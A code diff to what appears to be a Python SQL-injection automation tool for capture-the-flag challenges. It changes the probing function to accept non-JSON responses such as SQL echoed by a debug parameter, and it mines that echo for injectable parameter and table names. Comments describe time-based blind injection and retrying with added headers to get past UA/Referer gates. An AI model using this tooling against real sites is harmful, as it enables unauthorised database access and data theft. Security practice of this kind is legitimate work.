@@ -92,8 +92,13 @@ def container_sid(page_url: str) -> str:
 
 def probe_json(url: str, method: str, param: str, cookie: str,
                headers: dict, stage: str = "",
-               extra_fields: dict | None = None) -> tuple[bool, dict, str]:
-    """探测接口是否返回 {"code":..}；被 UA/Referer 网关拦住时自动补头重试。"""
+               extra_fields: dict | None = None,
+               accept_any: bool = False) -> tuple[bool, dict, str]:
+    """探测接口是否返回 {"code":..}；被 UA/Referer 网关拦住时自动补头重试。
+
+    accept_any：接受非 JSON 的 200 响应（如 debug=1 的 SQL 原文回显），
+    供调用方按回显内容自行判断命中（web217 参数发现用）。网关消息与
+    404 HTML 仍被排除，保证头部修复循环不被打断。"""
     body = ""
     val = apply_encoder("1", LAST.get("encoder", ""))
     for _ in range(4):
@@ -108,11 +113,11 @@ def probe_json(url: str, method: str, param: str, cookie: str,
         if s == 200 and body.lstrip().startswith('{"code"') \
                 and not _is_auth_fail(body):
             return True, headers, body
-        if s == 200 and not body.strip() and not _is_gate(body) \
-                and not _is_auth_fail(body) and "<html" not in body.lower():
-            # 时间盲注族（web214）：200 空体即正常（无回显，仅延时差异）。
-            # 必须限定空体——网关消息/查询失败 JSON 都有内容，放行会打断
-            # UA/Referer 头部修复循环（web210 回归实测）
+        if s == 200 and "<html" not in body.lower() and not _is_gate(body) \
+                and (accept_any or (not body.strip() and not _is_auth_fail(body))):
+            # 无 accept_any 时仅时间盲注族的「200 空体」算正常——必须限定
+            # 空体：网关消息/查询失败 JSON 都有内容，放行会打断 UA/Referer
+            # 头部修复循环（web210 回归实测）
             return True, headers, body
         new = _gate_headers(body, headers)
         if new == headers:
@@ -227,19 +232,21 @@ def resolve_entry(base: str, name: str, cookie: str) -> dict:
             api_cands = [urllib.parse.urljoin(base, "api/index.php"),
                          urllib.parse.urljoin(base, "api/")]
             for u in api_cands:
+                # 第一轮：debug=1 → SQL 原文回显 → 解析真实参数名。空体/语法
+                # 错误响应不算命中——只有回显解析出 where <参数> = 才返回
+                # （web217 实测：id 探针空体、ip 探针才有回显，顺序不能反）
                 for pc in param_cands:
                     ok, hdrs, body = probe_json(u, "POST", pc, cookie, {},
-                                                extra_fields={"debug": "1"})
-                    if not ok:
-                        continue
+                                                extra_fields={"debug": "1"},
+                                                accept_any=True)
                     m2 = re.search(r"where\s+(\w+)\s*=", body)
                     if m2:
-                        m3 = re.search(r"from\s+([a-zA-Z_][\w]*)", body)
+                        m3 = re.search(r"from\s+([a-zA-Z_][\w]*)", body)
                         if m3:
                             LAST["table_hint"] = m3.group(1)
                         return _result(u, m2.group(1), "POST", html,
                                        {"debug": "0"}, hdrs)
-                # debug 无回显时退回空体接受（时间盲注族无回显属正常）
+                # 第二轮：debug 无回显时退回空体接受（时间盲注族无回显属正常）
                 for pc in param_cands:
                     ok, hdrs, body = probe_json(u, "POST", pc, cookie, {}, {})
                     if ok:
